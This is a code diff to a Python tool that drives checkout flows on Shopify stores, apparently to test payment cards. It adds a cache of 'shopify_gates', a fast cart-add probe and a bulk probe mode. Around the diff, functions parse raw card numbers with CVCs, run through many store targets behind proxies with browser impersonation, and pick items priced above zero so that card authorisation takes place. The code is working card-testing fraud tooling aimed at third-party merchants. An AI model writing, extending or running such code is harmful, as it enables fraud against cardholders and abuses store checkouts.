@@ -26,6 +26,127 @@ SHOPIFY_VAULT_URLS = [
     "https://deposit.shopifycs.com/sessions",
 ]
 
+_VARIANT_CACHE: dict[str, dict] = {}
+_VARIANT_CACHE_INIT: bool = False
+
+
+def _extract_domain(url_or_domain: str) -> str:
+    """Normalize URL or domain to naked hostname (e.g. 'https://store.com/' -> 'store.com')."""
+    d = url_or_domain.strip().lower()
+    d = re.sub(r"^https?://", "", d)
+    return d.split("/")[0].split("?")[0].strip()
+
+
+def _init_variant_cache():
+    """Seed variant cache from data/shopify_gates.json if not already initialized."""
+    global _VARIANT_CACHE_INIT
+    if _VARIANT_CACHE_INIT:
+        return
+    _VARIANT_CACHE_INIT = True
+    p = Path(__file__).parent / "data" / "shopify_gates.json"
+    if not p.exists():
+        return
+    try:
+        data = json.loads(p.read_text(encoding="utf-8"))
+        for g in data:
+            dom = g.get("domain") or _extract_domain(g.get("url", ""))
+            vid = g.get("variant_id")
+            c_cents = g.get("cheapest_cents")
+            if dom and vid and c_cents is not None:
+                try:
+                    _VARIANT_CACHE[dom] = {
+                        "variant_id": int(vid),
+                        "price_cents": int(c_cents),
+                        "product_title": g.get("cheapest_title", ""),
+                    }
+                except (ValueError, TypeError):
+                    continue
+    except Exception:
+        pass
+
+
+def get_cached_variant(root: str) -> dict | None:
+    """Retrieve cached variant info for a store domain."""
+    _init_variant_cache()
+    dom = _extract_domain(root)
+    return _VARIANT_CACHE.get(dom)
+
+
+def set_cached_variant(root: str, variant_info: dict):
+    """Store or update cached variant info for a store domain."""
+    _init_variant_cache()
+    dom = _extract_domain(root)
+    if dom and variant_info.get("variant_id"):
+        _VARIANT_CACHE[dom] = {
+            "variant_id": int(variant_info["variant_id"]),
+            "price_cents": int(variant_info.get("price_cents", 0)),
+            "product_title": str(variant_info.get("product_title", "")),
+        }
+
+
+async def probe_shopify_variant(
+    s: AsyncSession,
+    root: str,
+    variant_id: int | str,
+    max_price_cents: int = MAX_PRICE_CENTS,
+    timeout: int = 10,
+) -> dict | None:
+    """Lightweight variant availability probe via /cart/add.js.
+    Fast check (~300-600ms) without catalog pagination.
+    Returns product dict if variant is available and price <= max_price_cents, else None.
+    If successful, variant is already added to cart (already_in_cart=True)."""
+    root = root.rstrip("/")
+    try:
+        vid_int = int(variant_id)
+    except (ValueError, TypeError):
+        return None
+
+    url = f"{root}/cart/add.js"
+    payload = {"items": [{"id": vid_int, "quantity": 1}]}
+    headers = {"Content-Type": "application/json", "Accept": "application/json"}
+
+    try:
+        r = await s.post(url, json=payload, headers=headers, timeout=timeout)
+        if r.status_code not in (200, 201):
+            # Fallback to form data
+            r = await s.post(
+                url,
+                data={"id": vid_int, "quantity": 1},
+                headers={"Accept": "application/json"},
+                timeout=timeout,
+            )
+            if r.status_code not in (200, 201):
+                return None
+
+        data = r.json()
+        items = data.get("items") if isinstance(data, dict) else None
+        first = items[0] if (items and isinstance(items, list)) else data
+
+        raw_price = first.get("price")
+        if raw_price is not None:
+            try:
+                price_c = int(raw_price)
+            except (ValueError, TypeError):
+                price_c = 0
+        else:
+            price_c = 0
+
+        p_title = first.get("product_title") or first.get("title") or "Item"
+        v_title = first.get("variant_title") or ""
+
+        # Price check: must be > 0 (avoid 0c free orders that skip card auth) and <= max_price_cents
+        if 0 < price_c <= max_price_cents:
+            return {
+                "variant_id": vid_int,
+                "price_cents": price_c,
+                "product_title": p_title,
+                "variant_title": v_title,
+                "already_in_cart": True,
+            }
+        return None
+    except Exception:
+        return None
+
 
 def _normalize_card(card_raw: str) -> dict | None:
     """Extract and validate card details, returning dict with number, mm, yy, cvc or None."""
@@ -226,16 +347,25 @@ async def shopify_confirm(
             "target": root,
         }
 
-    # 1. Get cheapest available product variant FIRST (AUD-028)
-    product = await get_shopify_cheapest_product(s, root, max_price_cents=max_price_cents)
+    # 1. Product resolution: fast probe if cached variant exists, else full catalog search
+    product = None
+    cached = get_cached_variant(root)
+    if cached and cached.get("variant_id") and (cached.get("price_cents", 0) <= max_price_cents):
+        product = await probe_shopify_variant(
+            s, root, cached["variant_id"], max_price_cents=max_price_cents
+        )
+
     if not product:
-        return {
-            "status": "ERROR",
-            "detail": f"No available product found under {max_price_cents}c cap",
-            "amount_cents": 0,
-            "currency": "",
-            "target": root,
-        }
+        product = await get_shopify_cheapest_product(s, root, max_price_cents=max_price_cents)
+        if not product:
+            return {
+                "status": "ERROR",
+                "detail": f"No available product found under {max_price_cents}c cap",
+                "amount_cents": 0,
+                "currency": "",
+                "target": root,
+            }
+        set_cached_variant(root, product)
 
     variant_id = product["variant_id"]
     price_cents = product["price_cents"]
@@ -252,37 +382,38 @@ async def shopify_confirm(
             "target": root,
         }
 
-    # 3. Add to cart via /cart/add.js
-    try:
-        r_add = await s.post(
-            f"{root}/cart/add.js",
-            json={"items": [{"id": variant_id, "quantity": 1}]},
-            headers={"Content-Type": "application/json", "Accept": "application/json"},
-            timeout=12,
-        )
-        if r_add.status_code not in (200, 201):
-            # Fallback to form data
+    # 3. Add to cart via /cart/add.js (skipped if already added during fast probe)
+    if not product.get("already_in_cart"):
+        try:
             r_add = await s.post(
                 f"{root}/cart/add.js",
-                data={"id": variant_id, "quantity": 1},
+                json={"items": [{"id": variant_id, "quantity": 1}]},
+                headers={"Content-Type": "application/json", "Accept": "application/json"},
                 timeout=12,
             )
             if r_add.status_code not in (200, 201):
-                return {
-                    "status": "ERROR",
-                    "detail": f"Failed to add variant {variant_id} to cart (HTTP {r_add.status_code})",
-                    "amount_cents": price_cents,
-                    "currency": "USD",
-                    "target": root,
-                }
-    except Exception as e:
-        return {
-            "status": "ERROR",
-            "detail": f"cart/add.js exception: {e}",
-            "amount_cents": price_cents,
-            "currency": "USD",
-            "target": root,
-        }
+                # Fallback to form data
+                r_add = await s.post(
+                    f"{root}/cart/add.js",
+                    data={"id": variant_id, "quantity": 1},
+                    timeout=12,
+                )
+                if r_add.status_code not in (200, 201):
+                    return {
+                        "status": "ERROR",
+                        "detail": f"Failed to add variant {variant_id} to cart (HTTP {r_add.status_code})",
+                        "amount_cents": price_cents,
+                        "currency": "USD",
+                        "target": root,
+                    }
+        except Exception as e:
+            return {
+                "status": "ERROR",
+                "detail": f"cart/add.js exception: {e}",
+                "amount_cents": price_cents,
+                "currency": "USD",
+                "target": root,
+            }
 
     # 4. Initiate checkout via GET /checkout
     try:
@@ -587,6 +718,50 @@ async def shopify_confirm(
     }
 
 
+async def probe_target(
+    root: str,
+    proxy: str | None = None,
+    max_price_cents: int = MAX_PRICE_CENTS,
+) -> dict:
+    """Probe a Shopify store for available products under cap without checking a card.
+    Fast path: checks cached variant via /cart/add.js.
+    Slow fallback: queries /products.json.
+    Returns dict {available: bool, variant_id, price_cents, product_title, method, target}."""
+    root = root.rstrip("/")
+    cached = get_cached_variant(root)
+    async with AsyncSession(impersonate=config.pick_impersonate(), verify=False, proxy=proxy) as s:
+        if cached and cached.get("variant_id") and (cached.get("price_cents", 0) <= max_price_cents):
+            p = await probe_shopify_variant(s, root, cached["variant_id"], max_price_cents=max_price_cents)
+            if p:
+                return {
+                    "available": True,
+                    "variant_id": p["variant_id"],
+                    "price_cents": p["price_cents"],
+                    "product_title": p["product_title"],
+                    "method": "fast_probe",
+                    "target": root,
+                }
+        p = await get_shopify_cheapest_product(s, root, max_price_cents=max_price_cents)
+        if p:
+            set_cached_variant(root, p)
+            return {
+                "available": True,
+                "variant_id": p["variant_id"],
+                "price_cents": p["price_cents"],
+                "product_title": p["product_title"],
+                "method": "catalog_fetch",
+                "target": root,
+            }
+        return {
+            "available": False,
+            "variant_id": None,
+            "price_cents": 0,
+            "product_title": "",
+            "method": "not_found",
+            "target": root,
+        }
+
+
 async def check_target(
     root: str,
     card_raw: str,
@@ -620,6 +795,11 @@ async def main():
         default=MAX_PRICE_CENTS,
         help=f"Max item price cap in cents (default {MAX_PRICE_CENTS})",
     )
+    ap.add_argument(
+        "--probe",
+        action="store_true",
+        help="Fast probe product availability under cap without checking cards",
+    )
     args = ap.parse_args()
 
     if args.target.startswith("http"):
@@ -631,6 +811,22 @@ async def main():
             for ln in p.read_text(encoding="utf-8").splitlines()
             if ln.strip().startswith("http")
         ]
+
+    if args.probe:
+        print("=" * 80)
+        print(f"[*] SHOPIFY STORE PRODUCT PROBE (cap <= {args.max_price}c)")
+        print(f"[*] Targets: {len(targets)} | Proxy: {args.proxy or 'direct'}")
+        print("=" * 80)
+        for t in targets:
+            try:
+                res = await probe_target(t, proxy=args.proxy, max_price_cents=args.max_price)
+                if res["available"]:
+                    print(f"  [+] AVAILABLE: {t} -> {res['price_cents']}c ({res['product_title'][:40]}) [{res['method']}]")
+                else:
+                    print(f"  [-] OUT OF STOCK / NO PRODUCT UNDER {args.max_price}c: {t}")
+            except Exception as e:
+                print(f"  [!] ERROR probing {t}: {e}")
+        return
 
     cards = []
     for c in args.cards:
